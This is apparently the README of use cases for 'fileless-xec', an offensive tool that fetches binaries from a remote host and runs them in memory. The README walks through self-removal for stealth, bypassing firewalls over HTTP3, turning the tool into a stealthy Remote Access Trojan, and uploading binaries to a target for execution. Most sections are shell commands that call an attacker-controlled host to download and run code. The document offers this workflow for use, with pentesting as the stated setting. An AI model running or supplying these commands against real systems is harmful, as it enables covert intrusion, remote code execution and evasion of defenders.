# `fileless-xec` use cases and examples


 - [`curl | sh` for binaries](#curl--sh-for-binaries)
 - [Execute binary with stdout/stdin](#execute-binary-with-stdoutstdin)
 - [Execute binary with arguments](#execute-binary-with-arguments)
 - [`fileless-xec` self remove](#fileless-xec-self-remove)
 - ["Remote go": execute go binaries without having go installed locally](#remote-go-execute-go-binaries-without-having-go-installed-locally)
 - [Bypass firewall with HTTP3](#bypass-firewall-with-http3)
 - [Execute a shell script](#execute-a-shell-script)
 - [`fileless-xec` server mode](#fileless-xec-server-mode)
 - [`fileless-xec` on windows](#fileless-xec-on-windows)

## `curl | sh` for binaries

This is the basic use case for `fileless-xec`. It enables us to run a remote binary without dropping it on disk:
```shell
fileless-xec [binary_url]
```

## Execute binary with stdout/stdin

`fileless-xec` is able to execute binaries with stdout and stdin. There isn't any special configuration or flag to make it works

## Execute binary with arguments

You can also passed arguments to your binary:
```
fileless-xec [binary_url] -- [flags_and_values_for_the_binary]
```

## `fileless-xec` self remove

On linux, you could remove `fileless-xec`from disk during its execution. This a step further for stealthiness:
```
fileless-xec --self-remove [binary_url]
```

## "Remote go": execute go binaries without having go installed locally

### Pre-requisites

* Attacker machine: 
  * go installed
* Target machine:
  * `fileless-xec`


If you want to run some go code on machine where go is not installed and you don't want to install it:

* For stealthiness reason (in a pentest, the less we install the better)
* For idleness orquickness reason

You will build your go on attacker machine, and use `fileless-xec` to execute it on target machine.

Of course, this use case is applicable for every program language that provides toolchains to make binaries (ex C/C++)

## Bypass firewall with HTTP3

See [HTTP3 - README](https://github.com/ariary/fileless-xec#http3quic) for explanation about the benefit of HTTP3 (spoil: bypass fw):

On attacker machine, set up HTTP3 server:
```bash
./example/http3/genkey.sh
go build light-server.go
./light-server  # launch on port 6121
```

On target machine, tell that you want to use http3:
```
fileless-xec --http3 https://[attacker_ip]:6121/[binary_name]
```

## Execute a shell script

If you are tired of running binaries.. and you want to run shell. This is a workaround example.

1. Transform your script in go code: (delete line `#!/bin/bash` and avoid `"`)

```
go build ./example/shell/generate.go
./generate myscript.sh
```

2. Compile it:

 ```
 go build nestedscript.go
 ```

3. Classicaly execute it on target
```
fileless-xec  [binary_url]
```

## `fileless-xec` server mode

This feature provide  another type of interaction between target and attacker machine:
target machine would have a server (upload binaries server) and attacker machine will send the binary ( trough http, http3, ...) to the server. Once the binary file received the target machine execute it as usual.

We change the connection direction between the 2 machines. As bind shell/reverse shell, it is useful to have both possibilities to adapt to the different possible network permissions



On target Launch the server:
```
fileless-xec server [port]
```

On Attacker machine send the binary to be executed:
* with curl: `curl -X POST -F "executable=@[BINARY_FILENAME]" http://[TARGET_IP:PORT]/upload`
* using client provide in example: 
```
#change url and port in ./example/client/client.go to the target machine ones
go build ./example/client/client.go
./client [BINARY_FILENAME]`
```

### RAT (Remote Access Trojan) scenarion

fileless-xec is a dropper that make your program execution stealth. But we can go further and launch a stealth fileless-xec server (RAT), that will wait for program execution

1. On attacker machine build/download fileless-xec and expose it trough HTTP server:
```
# in the same folder of fileless-xec binary
python3 -m http.server 11211
```

2. On target machine launch your stealth fileless-xec (with an "unstealth" one):
```
./fileless-xec --self-remove http://[ATTACKER_IP:PORT]/fileless-xec -- serve 11211
```

3. Now your fileless-xec is silently and patiently waiting for your program to execute it. If you want execute it, on attacker machine:
```
curl -X POST -F "executable=@[BINARY_FILENAME]" http://[TARGET_IP]:11211/upload
```

## `fileless-xec` on windows

You could alse use `fileless-xec` on windows.
Build `filess-xec.exe` with Makefile:
```
make windows.build.fileless-xec
```

Usage is the same except that it is less stealth as binaries are on disk and you can't self remove `fileless-xec` while execution. Meanwhile the binary is immediatly deleted after execution
